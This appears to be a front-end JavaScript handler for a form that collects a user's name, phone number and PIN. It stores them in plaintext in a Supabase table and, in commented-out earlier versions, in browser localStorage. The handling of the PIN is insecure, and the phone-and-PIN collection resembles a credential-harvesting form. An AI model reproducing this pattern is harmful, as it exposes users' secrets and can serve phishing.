// document.getElementById("detailsForm").addEventListener("submit", function(e) {
//     e.preventDefault();

//     const entry = {
//         name: document.getElementById("name").value,
//         phone: document.getElementById("phone").value,
//         pin: document.getElementById("pin").value,
//         date: new Date().toLocaleString()
//     };

//     let data = JSON.parse(localStorage.getItem("submissions")) || [];
//     data.push(entry);
//     localStorage.setItem("submissions", JSON.stringify(data));

//     document.getElementById("successMsg").innerText = "Details submitted successfully ✅";
//     document.getElementById("detailsForm").reset();
// });
 



// document.getElementById("detailsForm").addEventListener("submit", function (e) {
//   e.preventDefault();

//   const entry = {
//     name: document.getElementById("name").value,
//     phone: document.getElementById("phone").value,
//     pin: document.getElementById("pin").value, 
//     date: new Date().toLocaleString()
//   };

//   // Save to localStorage
//   let data = JSON.parse(localStorage.getItem("submissions")) || [];
//   data.push(entry);
//   localStorage.setItem("submissions", JSON.stringify(data));

//   // OPTIONAL: reset form
//   document.getElementById("detailsForm").reset();

//   // ✅ Redirect user
//   window.location.href = "successful-submission.html";
// });


import { supabase } from "./supabase.js";

const form = document.getElementById("detailsForm");

form.addEventListener("submit", async (e) => {
  e.preventDefault();

  const name = document.getElementById("name").value;
  const phone = document.getElementById("phone").value;
  const pin = document.getElementById("pin").value;

  const { error } = await supabase
    .from("submissions")
    .insert([{ name, phone, pin }]);

     // save user data for success page
localStorage.setItem("submittedName", name);
localStorage.setItem("submittedPhone", phone);




  if (error) {
    alert("Submission failed ❌");
    console.error(error);
  } else {
    window.location.href = "success.html";
  }
});
